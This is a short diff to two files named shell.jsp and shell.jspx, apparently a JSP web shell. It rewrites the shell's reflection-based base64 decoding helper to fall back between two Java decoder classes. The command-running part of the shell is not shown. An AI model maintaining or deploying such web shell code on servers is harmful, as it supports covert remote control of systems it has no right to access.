@@ -56,14 +56,20 @@ shell.jsp
     }
 
     public byte[] base64Decode(String str) throws Exception {
+      Class base64;
+      byte[] value = null;
+      try {
+        base64=Class.forName("sun.misc.BASE64Decoder");
+        Object decoder = base64.newInstance();
+        value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] {String.class }).invoke(decoder, new Object[] { str });
+      } catch (Exception e) {
         try {
-            Class clazz = Class.forName("sun.misc.BASE64Decoder");
-            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
-        } catch (Exception e) {
-            Class clazz = Class.forName("java.util.Base64");
-            Object decoder = clazz.getMethod("getDecoder").invoke(null);
-            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
-        }
+          base64=Class.forName("java.util.Base64");
+          Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
+          value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { str });
+        } catch (Exception ee) {}
+      }
+      return value;
     }
 %>
 <%
@@ -87,14 +93,20 @@ shell.jspx
             }
         }
         public byte[] base64Decode(String str) throws Exception {
+            Class base64;
+            byte[] value = null;
             try {
-                Class clazz = Class.forName("sun.misc.BASE64Decoder");
-                return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
+                base64=Class.forName("sun.misc.BASE64Decoder");
+                Object decoder = base64.newInstance();
+                value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] {String.class }).invoke(decoder, new Object[] { str });
             } catch (Exception e) {
-                Class clazz = Class.forName("java.util.Base64");
-                Object decoder = clazz.getMethod("getDecoder").invoke(null);
-                return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
+                try {
+                    base64=Class.forName("java.util.Base64");
+                    Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
+                    value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { str });
+                } catch (Exception ee) {}
             }
+            return value;
         }
     </jsp:declaration>
     <jsp:scriptlet>
